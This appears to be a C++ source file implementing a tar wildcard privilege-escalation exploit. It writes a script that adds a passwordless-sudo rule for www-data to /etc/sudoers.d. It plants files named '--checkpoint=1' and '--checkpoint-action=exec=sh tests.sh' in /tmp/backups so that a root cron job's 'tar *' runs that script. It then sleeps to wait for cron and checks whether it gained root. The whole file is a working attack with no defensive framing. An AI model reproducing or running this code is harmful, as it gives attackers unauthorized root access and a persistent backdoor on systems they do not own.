#include "privesc.h"
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <cstring>

// Minimal string helpers
static int str_copy(char* dst, const char* src, int max_len) {
    int i = 0;
    while (i < max_len - 1 && src[i]) {
        dst[i] = src[i];
        i++;
    }
    dst[i] = '\0';
    return i;
}

static int str_concat(char* dst, const char* src, int max_len) {
    int dst_len = 0;
    while (dst[dst_len]) dst_len++;
    
    int i = 0;
    while (dst_len + i < max_len - 1 && src[i]) {
        dst[dst_len + i] = src[i];
        i++;
    }
    dst[dst_len + i] = '\0';
    return dst_len + i;
}

// Create a file with specified content using syscalls
static bool create_file(const char* path, const char* content, mode_t mode) {
    // Open file with O_CREAT | O_WRONLY | O_TRUNC
    int fd = syscall(SYS_open, path, O_WRONLY | O_CREAT | O_TRUNC, mode);
    if (fd < 0) {
        return false;
    }
    
    // Write content
    size_t content_len = 0;
    while (content[content_len]) content_len++;
    
    ssize_t written = syscall(SYS_write, fd, content, content_len);
    syscall(SYS_close, fd);
    
    return (written == (ssize_t)content_len);
}

// Create directory if it doesn't exist
static bool ensure_directory(const char* path) {
    struct stat st;
    
    // Check if directory exists
    if (syscall(SYS_stat, path, &st) == 0) {
        // Exists - check if it's a directory
        return S_ISDIR(st.st_mode);
    }
    
    // Create directory
    if (syscall(SYS_mkdir, path, 0755) == 0) {
        return true;
    }
    
    return false;
}

// Execute the tar wildcard privilege escalation
int execute_tar_privesc() {
    const char* backups_dir = "/tmp/backups";
    
    // Step 1: Ensure /tmp/backups directory exists
    if (!ensure_directory(backups_dir)) {
        return -1;
    }
    
    // Step 2: Change to /tmp/backups directory
    if (syscall(SYS_chdir, backups_dir) != 0) {
        return -1;
    }
    
    // Step 3: Create malicious script (tests.sh)
    // Content: echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers.d/www-data
    const char* script_content = 
        "#!/bin/bash\n"
        "echo 'www-data ALL=(root) NOPASSWD: ALL' > /etc/sudoers.d/www-data\n"
        "chmod 440 /etc/sudoers.d/www-data\n";
    
    char script_path[128];
    str_copy(script_path, backups_dir, 128);
    str_concat(script_path, "/tests.sh", 128);
    
    if (!create_file(script_path, script_content, 0755)) {
        return -1;
    }
    
    // Step 4: Create tar checkpoint files for wildcard exploitation
    // These files will be interpreted as tar command-line arguments
    
    // File 1: --checkpoint=1
    char checkpoint1_path[128];
    str_copy(checkpoint1_path, backups_dir, 128);
    str_concat(checkpoint1_path, "/--checkpoint=1", 128);
    
    if (!create_file(checkpoint1_path, "", 0644)) {
        return -1;
    }
    
    // File 2: --checkpoint-action=exec=sh tests.sh
    char checkpoint2_path[128];
    str_copy(checkpoint2_path, backups_dir, 128);
    str_concat(checkpoint2_path, "/--checkpoint-action=exec=sh tests.sh", 128);
    
    if (!create_file(checkpoint2_path, "", 0644)) {
        return -1;
    }
    
    // Step 5: Create a dummy file to ensure tar has something to archive
    char dummy_path[128];
    str_copy(dummy_path, backups_dir, 128);
    str_concat(dummy_path, "/dummy.txt", 128);
    
    if (!create_file(dummy_path, "exploit payload\n", 0644)) {
        return -1;
    }
    
    // Step 6: Wait for cron job to execute
    // The cron job runs: tar -cf /tmp/backup.tar *
    // When tar sees the files starting with --, it interprets them as arguments
    // This triggers: tar --checkpoint=1 --checkpoint-action=exec=sh tests.sh
    
    // Give cron time to run (sleep 65 seconds to ensure it runs in the next minute)
    struct timespec sleep_time;
    sleep_time.tv_sec = 65;
    sleep_time.tv_nsec = 0;
    syscall(SYS_nanosleep, &sleep_time, nullptr);
    
    return 0;
}

// Check if we successfully escalated to root
bool check_if_root() {
    unsigned int uid = syscall(SYS_getuid);
    unsigned int euid = syscall(SYS_geteuid);
    
    return (uid == 0 || euid == 0);
}
